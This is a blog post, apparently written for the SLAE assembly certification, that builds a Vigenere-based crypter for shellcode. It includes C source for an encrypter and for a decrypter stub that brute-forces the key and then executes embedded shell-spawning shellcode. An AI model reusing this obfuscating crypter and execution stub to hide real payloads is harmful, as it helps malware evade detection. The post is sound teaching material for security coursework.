---
layout: post
title: "SLAE Assignment #7 | Creating a basic crypter for shellcode encryption"
date: 2015-12-04
comments: true
categories:
---

This post is about the crypter assignment in the [SLAE](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/) exam.

My crypter is a simple Vigenere cipher with a little twist, the key is bruteforced.
This is done possible because of saving a keyword into the beginning of the shellcode in order to 
know whether we found the correct key or not.

Format:

```
___________________________________________________
|                   |                             |
| keyword encrypted |    shellcode encrypted      |
|___________________|_____________________________|


```

The cipher is most easily explained and most commonly shown with the following algebraic description:

Encryption:

```
Ci = Mi+K(i mod keylength) mod 256
```

Decryption:

```
Mi = Ci-K(i mod keylength) mod 256
```

The following bruteforce operation must be done to find the key:

```
keyword = arrayOfBytes with length = keylength
key = empty arrayOfBytes with length = keylength

for index in range(0,keylength):
  for n in range(1,256):
    if Ci - n == keyword[n]:
      key[index] = n
      break
```


The encryption code:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define KEYLENGTH 10

const char* keyword = "1234567890";
const char* key   = "4422338877";

unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


char* encode(unsigned char arr[], int arrLength, const unsigned char key[], int keyLength){
    unsigned char* encoded = malloc(sizeof(char) * (arrLength+KEYLENGTH));
    
    //First set the keyword elems 
    for(int i=0; i < KEYLENGTH; i++){
      encoded[i] = (keyword[i]+key[i%keyLength])%256;
    }

    //Then the actual shellcode
    for(int i=0; i<arrLength; i++){
      encoded[i+KEYLENGTH] = (arr[i]+key[i%keyLength])%256;
    }
    return encoded;
}

int main(){
    unsigned char* output = encode(shellcode,strlen(shellcode),key,strlen(key));
    
    for(int x = 0; x<strlen(shellcode)+KEYLENGTH;x++){
        printf("\\x%02x",output[x]);
    }

    return 0;
}
```

The decrypter, ie, the stub:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#define KEYLENGTH 10


const char* keyword = "1234567890";
unsigned char encryptedShellcode[] = \
"\x65\x66\x65\x66\x68\x69\x6f\x70\x70\x67\x65\xf4\x82\x9a\x95\x94\xab\xa0\x9f\x66\x63\x63\x61\x9a\x62\x95\xa1\xa6\xc0\x1a\x84\xbd\x14\x85\xbc\x14\xe8\x43\x04\xb7";

char* extractShellcode();
char* decode(unsigned char arr[], int arrLength, const unsigned char key[]);

int main(){
  char* shellcode = extractShellcode();
    int (*ret)() = (int(*)())shellcode;
    (ret+KEYLENGTH)();
  return 0;
}

//Bruteforces the the key with the help of the keyword value.
//The decrypted shellcode is returned
char* extractShellcode(){
  char keyArray[KEYLENGTH];
  char* decoded;

  for(int i=0; i < KEYLENGTH; i++){
    for(char j=0; j < 256; j++){
      //Check if keyword matches for this position
      keyArray[i]=j;
      decoded = decode(encryptedShellcode,strlen(encryptedShellcode),keyArray);
      if(decoded[i]==keyword[i]){
        break;
      }
      free(decoded);
    }
  }
  printf("The key was found to be: %.*s\n", KEYLENGTH, keyArray);

  return decoded;
}

//Decodes given array with key as vigenere cipher specifies.
char* decode(unsigned char arr[], int arrLength, const unsigned char key[]){
  unsigned char* decoded = malloc(sizeof(char) * arrLength+1);

    for(int i=0; i<arrLength; i++){
        decoded[i] = (arr[i]-key[i%KEYLENGTH])%256;
    }
    return decoded;
}
```

Lets run it:

```bash
root@kali:~/Desktop/SLAE/assignment-7# gcc encrypt.c -o encrypt -std=gnu99
root@kali:~/Desktop/SLAE/assignment-7# ./encrypt 
\x65\x66\x65\x66\x68\x69\x6f\x70\x70\x67\x65\xf4\x82\x9a\x95\x94\xab\xa0\x9f\x66\x63\x63\x61\x9a\x62\x95\xa1\xa6\xc0\x1a\x84\xbd\x14\x85\xbc\x14\xe8\x43\x04\xb7
root@kali:~/Desktop/SLAE/assignment-7# gcc decrypt.c -o decrypt -std=gnu99 -z execstack
root@kali:~/Desktop/SLAE/assignment-7# ./decrypt 
The key was found to be: 4422338877
root@kali:/root/Desktop/SLAE/assignment-7# exit
exit
```

I started this post before I started the Crypto course in school, now I'm finishing it after it's completion and I feel I
could have picked a more fancy encryption, CBC. schoolbook RSA or any the like but still the Vigenere was quite fun to program with 
the bruteforcing part.

---

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE - 569